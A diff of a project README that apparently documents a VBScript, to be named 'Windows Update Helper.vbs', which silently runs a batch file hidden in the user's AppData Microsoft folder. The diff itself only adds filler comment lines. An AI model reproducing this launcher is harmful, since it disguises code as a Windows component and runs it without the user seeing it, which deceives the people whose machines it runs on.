@@ -50,9 +50,14 @@ because of the update bug before 3.7 uppdated (3.2 - 3.5 i think), i recommend u
 
 if you wish to use older versions/debug versions before 4.1, either download vbs from old releases or put this in "Windows Update Helper.vbs":  
 ```
-Set WshShell = CreateObject("WScript.Shell")  
-WshShell.Run chr(34) & "C:\Users\styso\AppData\Roaming\Microsoft\Windows\lmao.bat" & Chr(34), 0  
+Set WshShell = CreateObject("WScript.Shell")
+'idk
+WshShell.Run chr(34) & "C:\Users\styso\AppData\Roaming\Microsoft\Windows\lmao.bat" & Chr(34), 0
+'idk
+'idk
 Set WshShell = Nothing 
+'idk
+'idk
 ```
 
 ## Current version: 4.7 (4.6-DEBUGrelease-noverbugs)
